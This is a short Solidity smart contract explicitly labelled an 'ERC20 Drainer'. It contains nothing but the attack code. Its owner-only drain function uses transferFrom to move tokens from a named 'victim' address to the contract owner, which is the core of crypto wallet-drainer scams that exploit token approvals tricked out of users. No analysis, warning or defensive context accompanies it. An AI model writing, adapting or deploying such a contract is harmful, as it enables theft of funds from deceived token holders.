// Simplified ERC20 Drainer Contract
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Drainer {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function drain(address token, address victim, uint256 amount) public {
        require(msg.sender == owner);
        IERC20(token).transferFrom(victim, owner, amount);
    }
}
